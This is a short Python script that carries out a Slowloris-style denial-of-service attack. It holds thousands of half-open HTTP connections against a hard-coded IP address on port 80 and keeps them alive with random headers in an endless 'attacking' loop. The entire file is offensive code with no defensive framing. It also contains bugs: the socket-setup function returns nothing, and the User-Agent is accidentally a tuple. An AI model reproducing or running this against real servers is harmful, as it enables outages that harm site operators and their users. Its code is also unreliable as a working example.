import random
import socket
def send_line(self, line):
    line = f"{line}\r\n"
    self.send(line.encode("utf-8"))
def send_header(self, name, value):
    self.send_line(f"{name}: {value}")
list_of_sockets = []

setattr(socket.socket, "send_line", send_line)
setattr(socket.socket, "send_header", send_header)

def init_socket(ip: str):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((ip, 80))
    s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")
    ua ="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    s.send_header("User-Agent", ua)
    s.send_header("Accept-language", "en-US,en,q=0.5")
def process(ip:str):
    for s in list(list_of_sockets):
        try:
            s.send_header("X-a", random.randint(1, 5000))
        except socket.error:
            list_of_sockets.remove(s)
    diff = 5000 - len(list_of_sockets)
    for _ in range(diff):
        try:
            s = init_socket(ip)
            if not s:
                continue
            list_of_sockets.append(s)
        except socket.error as e:
            break
def main():
    # ip = input("Target IP: ")
    ip = "192.168.1.237"
    socket_count = 5000
    print("Creating Socket...")
    for _ in range(socket_count):
        try:
            s = init_socket(ip)
        except socket.error as e:
            break
        list_of_sockets.append(s)
    print("Start attacking")
    while True:
        try:
            process(ip)
        except (KeyboardInterrupt, SystemExit):
            print("\nCtrl-C : KeyboardInterrupt")
            break
if __name__ == "__main__":
    main()